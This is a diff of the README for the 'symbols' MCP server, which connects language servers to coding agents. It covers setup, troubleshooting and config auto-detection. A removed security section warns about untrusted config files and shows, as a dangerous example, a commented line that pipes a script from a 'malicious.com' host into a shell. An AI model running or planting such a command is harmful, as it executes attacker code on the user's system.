@@ -29,11 +29,11 @@ The server offers a minimal toolset intended to be simple to use and light on th
 
 ### Quickstart (`run` command)
 
-Use the `run` command to start the MCP server with the desired Language Server inline
+Use the `run` command to start the MCP server with the desired Language Server command defined inline.
 
 `npx -y "@p1va/symbols" run [run options] <lsp-cmd> [lsp args]`
 
-For simplicity examples follow Claude Code configuration schema
+See below configurations for the Language Servers tested. Other stdio Language Servers *should* work too. For simplicity examples follow Claude Code schema.
 
 <details>
 <summary>
@@ -76,19 +76,6 @@ For simplicity examples follow Claude Code configuration schema
 
 #### Troubleshooting
 
-**Startup Failure**
-
-To troubleshoot any failure on startup launch the same command and args found in the MCP configuration in a shell and turn on console output with the `--console` option. This will redirect logs that normally go to a file to the console for both the MCP server and Language Server.
-
-> ⚠️ `--console` option is intended only to speed up troubleshooting and will prevent MCP server from working properly.
-
-```sh
-npx -y @p1va/symbols@latest run \
-  -w path/to/root/of/project \
-  --console \
-  pyright-langserver --stdio
-```
-
 **Virtual Env not found**
 
 If the `logs` tool output includes errors or the `diagnostics` tool only reports module import errors even when none appear in the IDE these might be signs of Pyright not detecting the virtual environment.
@@ -111,7 +98,7 @@ venv = ".venv"
     <img src="https://img.shields.io/badge/-%23007ACC.svg?logo=typescript&logoColor=white" valign="middle">
   </picture>
   &nbsp;
-  <b>TypeScript Language Server</b>
+  <b>TypeScript</b>
 </summary>
 
 ### TypeScript Language Server
@@ -150,27 +137,10 @@ venv = ".venv"
 
 #### Troubleshooting
 
-**Startup Failure**
-
-To troubleshoot any failure on startup launch the same command and args found in the MCP configuration in a shell and turn on console output with the `--console` option. This will redirect logs that normally go to a file to the console for both the MCP server and Language Server.
-
-> ⚠️ `--console` option is intended only to speed up troubleshooting and will prevent MCP server from working properly.
-
-```sh
-set SYMBOLS_PRELOAD_FILES="src/index.ts" \
-set SYMBOLS_DIAGNOSTICS_STRATEGY="push" \
-npx -y @p1va/symbols@latest run \
-  -w path/to/root/of/project \
-  --console \
-  typescript-language-server --stdio
-```
-
-**No results in search tool**
+**Search: No results**
 
 For the search functionality to work the TS Language Server needs to compute the codebase index and keep in memory.
-This is done by keeping at least one code file open at any time.
-
-`SYMBOLS_PRELOAD_FILES="src/index.ts`
+This is done by keeping at least one code file open at any time. Use the `SYMBOLS_PRELOAD_FILES="src/index.ts` variable with paths to a few files.
 
 </details>
 
@@ -233,14 +203,14 @@ And finally restore the temporary project to trigger the download of the Languag
 Adjust both `RestorePackagesPath` and `ServerPath` to work on your machine and keep track of the latter.
 
 ```sh
-ServerPath=$HOME/.csharp-lsp
+SYMBOLS_ROSLYN_PATH=$HOME/.csharp-lsp
 ```
 
 ```sh
 dotnet restore ServerDownload.csproj \
   /p:Platform=your-platform-id \
   /p:RestorePackagesPath=/tmp/your/download/location \
-  /p:ServerPath=$ServerPath
+  /p:ServerPath=$SYMBOLS_ROSLYN_PATH
 ```
 
 #### Verify Installation
@@ -248,7 +218,7 @@ dotnet restore ServerDownload.csproj \
 To verify the outcome of the installation we run the command below
 
 ```sh
-$ServerPath/Microsoft.CodeAnalysis.LanguageServer --version
+$SYMBOLS_ROSLYN_PATH/Microsoft.CodeAnalysis.LanguageServer --version
 ```
 
 #### Configuration
@@ -268,6 +238,7 @@ $ServerPath/Microsoft.CodeAnalysis.LanguageServer --version
       ],
       "env": {
         "SYMBOLS_WORKSPACE_LOADER": "roslyn",
+        // Adjust this to your installation path
         "SYMBOLS_ROSLYN_PATH": "$HOME/.csharp-lsp",
       }
     }
@@ -275,12 +246,13 @@ $ServerPath/Microsoft.CodeAnalysis.LanguageServer --version
 }
 ```
 
+> ℹ️ Roslyn Language Server is also provided with the C# Dev Kit extension for VS Code however the launch command is a bit more complicated and changes each time the extension is updated. If wanting to try it i suggest trying the other modality (`config init` * `start`) which brings a template for the launch command
+
 #### Troubleshooting
 
 **Search: No Results Found**
 
-If `search` doesn't find results it's possible to warm up by pre-loading a few files 
-
+If `search` doesn't find results before a file was read for the first time it's possible to warm up by pre-loading a few files from different projects with
 `"SYMBOLS_PRELOAD_FILES": "src/Project/Program.cs"`
 
 **Linux: Max Number of Inotify Instances Reached**
@@ -335,11 +307,13 @@ Additionally JetBrains has more details on [this issue](https://youtrack.jetbrai
 
 #### Troubleshooting
 
-> ℹ️ Ensure either `compile_commands.json` is found in the working directory or provide the path where to find it with  `--compile-commands-dir=path/to/dir` 
+**General Errors**
+
+Ensure either `compile_commands.json` is found in the working directory or provide its directory path with  `--compile-commands-dir=path/to/dir` 
 
 **Search: No Results Found**
 
-To warm up index generation is possible to pre load and keep a few files opened by providing a list in ` SYMBOLS_PRELOAD_FILES` 
+Index is generate when the first file is opened. To warm up is possible to pre load and keep a one or more files opened by providing a list in ` SYMBOLS_PRELOAD_FILES` 
 
 
 </details>
@@ -489,101 +463,101 @@ $SYMBOLS_JDTLS_PATH/bin/jdtls --help
 
 ### Auto-detection (`config` & `start` commands)
 
-If you prefer to keep the MCP confg file clean, it's possible to move Language Server definitions out to a `language-servers.yaml` file and define when to launch them depending on detected files.
+If you prefer to keep your MCP config minimal and portable, it's possible to move Language Server definitions out to a dedicated file and have the MCP server read from there and auto-detect which Language Server to launch depending on the codebase.
 
-- `npx -y "@p1va/symbols@latest" config init --global`
-  - Linux: `~/.config/symbols-nodejs/language-servers.yaml`
-  - MacOS: `~/Library/Preferences/symbols-nodejs/language-servers.yaml`
-  - Windows: `%APPDATA%\symbols-nodejs\Config\language-servers.yaml`
-- `npx -y "@p1va/symbols@latest" config init -w path/to/workspace`
-  - `path/to/workspace/language-servers.yaml`
-- `npx -y "@p1va/symbols@latest" config init`
-  - `./language-servers.yaml`
+<details>
 
+<summary>
+  &nbsp;
+  🆕
+  &nbsp;
+  <b>1. <code>config init</code></b>
+</summary>
 
-`code $(npx -y @p1va/symbols config path)`
+#### Initialize Config
 
-- **Override** via CLI arg `npx -y @p1va/symbols@latest --config path/to/language-servers.yaml`
+**User-wide**
 
-#### Troubleshooting
+To create a user-wide config file run the following command
 
-Active config can be seen with `npx -y @p1va/symbols@latest config show`
+`npx -y "@p1va/symbols@latest" config init --global`
 
-#### Language Server Resolution
+This will create a configuration file to be found at:
 
-The MCP server launches the Language Server listing in its `workspace_files` any file detected in the current working directory. 
-e.g. pyproject.toml launches Pyright, package.json TypeScript
+- On Linux: `~/.config/symbols-nodejs/language-servers.yaml`
+- On MacOS: `~/Library/Preferences/symbols-nodejs/language-servers.yaml`
+- On Windows: `%APPDATA%\symbols-nodejs\Config\language-servers.yaml`
 
-These mappings can be updated or extended by modifying the configuration.
+**Workspace (Defaults to Current Directory)**
 
-Language Server resolution can be made explicit by providing the exact Language Server to launch with this flag `--lsp name-of-ls`
+To create a workspace config file run this instead
+
+`npx -y "@p1va/symbols@latest" config init -w path/to/workspace`
+
+- Will initialize `path/to/workspace/language-servers.yaml`
+
+`npx -y "@p1va/symbols@latest" config init` 
+
+- Will initialize `./language-servers.yaml`
 
 </details>
 
-#### Environment Variables
+<details>
 
-The MCP server supports environment variables for configuration. All variables use the `SYMBOLS_` prefix to clearly separate MCP server configuration from LSP-specific environment variables.
+<summary>
+  &nbsp;
+  ⚙️
+  &nbsp;
+  <b>2. <code>config show</code></b>
+</summary>
 
-**MCP Server Configuration** (apply globally to the MCP server):
+#### Tweak Config
 
-- `SYMBOLS_WORKSPACE` - Workspace directory path (defaults to current directory)
-- `SYMBOLS_LSP` - LSP server name to use (overrides auto-detection)
-- `SYMBOLS_LOGLEVEL` - Log level: `debug`, `info`, `warn`, or `error` (defaults to `info`)
-- `SYMBOLS_CONFIG_PATH` - Path to configuration file
+Use your editor (here i use `code`) to tweak the generated config file and comment, uncomment or add new language servers.
 
-**LSP-Specific Configuration** (apply to the active LSP server):
+`code $(npx -y @p1va/symbols config path)`
 
-- `SYMBOLS_WORKSPACE_LOADER` - Workspace loader type: `default`, `roslyn`, etc.
-- `SYMBOLS_DIAGNOSTICS_STRATEGY` - Diagnostics strategy: `push` or `pull` (defaults to `push`)
-- `SYMBOLS_DIAGNOSTICS_WAIT_TIMEOUT` - Diagnostics wait timeout in milliseconds (100-30000, defaults to 2000)
-- `SYMBOLS_PRELOAD_FILES` - Colon-separated (Unix) or semicolon-separated (Windows) list of files to preload during initialization
+#### Show Active Config
 
-Configuration precedence: **Environment Variables** > **YAML Config** > **Defaults**
+Finally run the command in your workspace (e.g. where you launch Claude Code) to see that the changes are being applied
 
-Example:
-```bash
-# Set diagnostics to pull mode with extended timeout
-export SYMBOLS_DIAGNOSTICS_STRATEGY=pull
-export SYMBOLS_DIAGNOSTICS_WAIT_TIMEOUT=5000
+`npx -y @p1va/symbols config show`
 
-# Use Roslyn workspace loader for C#
-export SYMBOLS_WORKSPACE_LOADER=roslyn
+`npx -y @p1va/symbols config show -w path/to/workspace`
 
-# Preload specific files (Unix/Linux/macOS - use : as delimiter)
-export SYMBOLS_PRELOAD_FILES="src/index.ts:src/types.ts:src/utils.ts"
+`npx -y @p1va/symbols config show -c path/to/config.yaml`
 
-# Preload specific files (Windows - use ; as delimiter)
-# set SYMBOLS_PRELOAD_FILES=src\index.ts;src\types.ts;src\utils.ts
+</details>
 
-# Start the MCP server
-npx -y @p1va/symbols@latest
+<details>
+
+<summary>
+  &nbsp;
+  ⚡️
+  &nbsp;
+  <b>3. <code>start</code></b>
+</summary>
+
+Update your MCP configuration with this MCP server. The first Language Server having `workspace_files` matching any of the files seen at the root of the workspace will be launched
+
+```jsonc
+{
+  "mcpServers": {
+    "symbols": {
+      "command": "npx",
+      "args": [
+        "-y", "@p1va/symbols@latest", "start",
+        // Defaults to current directory
+        "-w", "optional/path/to/workspace",
+        // Defaults to language-servers.yaml in current workspace
+        "-c", "optional/path/to/config.yaml",
+      ]
+    }
+  }
+}
 ```
 
-## Security Considerations
-
-### Configuration File Trust
-
-**⚠️ IMPORTANT**: Configuration files (`language-servers.yaml`) contain commands that are executed as subprocesses. Only use configuration files from trusted sources.
-
-- **DO** use configuration files you create yourself
-- **DO** use configuration files from trusted team members or official repositories
-- **DO NOT** load configuration files from untrusted or user-uploaded sources
-- **DO NOT** execute configs downloaded from unknown sources without review
-
-Commands in configuration files are parsed and executed directly. A malicious configuration file could execute arbitrary commands on your system.
-
-**Example of what to check in configs:**
-
-```yaml
-language-servers:
-  typescript:
-    command: npx -y typescript-language-server --stdio  # ✅ Safe - well-known LSP
-    # command: curl http://malicious.com/script.sh | sh  # ❌ Dangerous!
-```
-
-### Environment Variables
-
-Configuration files support environment variable expansion. Be cautious when using configs that reference environment variables, especially if those variables might contain sensitive data or influence command execution.
+</details>
 
 ## Development
 
@@ -595,137 +569,3 @@ Configuration files support environment variable expansion. Be cautious when usi
 - `pnpm start` starts the built artifacts
 - `pnpm test:unit` runs the unit tests
 - `pnpm test:integration:{language id}` runs the integration tests for a given language
-
-
-
-### 1. Add MCP Server
-
-Add the MCP server to your coding agent of choice
-
-<details>
-
-<summary>
-  &nbsp;
-  <picture>
-    <img src="https://img.shields.io/badge/Claude_Code-555?logo=claude" valign="middle">
-  </picture>
-</summary>
-
-### Claude Code
-
-To install the MCP server add this to your repository `.mcp.json` file
-
-```json
-{
-  "mcpServers": {
-    "symbols": {
-      "command": "npx",
-      "args": [
-        "-y",
-        "@p1va/symbols@latest"
-      ]
-    }
-  }
-}
-```
-
-or
-
-```sh
-claude mcp add symbols -- npx -y @p1va/symbols@latest
-```
-</details>
-
-<details>
-
-<summary>
-  &nbsp;
-  <picture>
-    <img src="https://img.shields.io/badge/OpenAI_Codex-%23412991?logo=openai&logoColor=white" valign="middle">
-  </picture>
-</summary>
-
-### OpenAI Codex
-
-To install the MCP server add this to your global `$HOME/.codex/config.toml` file
-
-```toml
-[mcp_servers.symbols]
-command = "npx"
-args = ["-y", "@p1va/symbols@latest"]
-```
-</details>
-
-<details>
-  
-<summary>
-  &nbsp;
-  <picture>
-    <img src="https://img.shields.io/badge/Gemini_CLI-8E75B2?logo=google%20gemini&logoColor=white" valign="middle">
-  </picture>
-</summary>  
-
-### Google Gemini CLI
-
-To install the MCP server add this to your repository `.gemini/settings.json` file
-
-```json
-{
-  "mcpServers": {
-    "symbols": {
-      "command": "npx",
-      "args": ["-y", "@p1va/symbols@latest"],
-      "env": {},
-      "cwd": ".",
-      "timeout": 30000,
-      "trust": true
-    }
-  }
-}
-```
-
-</details>
-
-<details>
-
-<summary>
-  &nbsp;
-  <picture>
-    <img src="https://img.shields.io/badge/GitHub_Copilot-8957E5?logo=github-copilot&logoColor=white" valign="middle">
-  </picture>
-</summary>
-
-### GitHub Copilot
-
-To install the MCP server add this to your repository's `.vscode/mcp.json` file
-
-```json
-{
-  "servers": {
-    "symbols": {
-      "type": "stdio",
-      "command": "npx",
-      "args": ["-y", "@p1va/symbols@latest"]
-    }
-  }
-}
-```
-
-</details>
-
-
-**Rules**
-
-- Everything after the end of command option (`--`) is treated as command to Language Server is provided after 
-  - Ensure modality is stdio (e.g. `--stdio` flag)
-  - Ensure no console output other than JSON-RPC are emitted
-
-
-- `--workspace path/to/workspace`
-- `--loglevel`
-- `--debug`
-
-
-
-Install the Language Servers relevant to your codebases
-
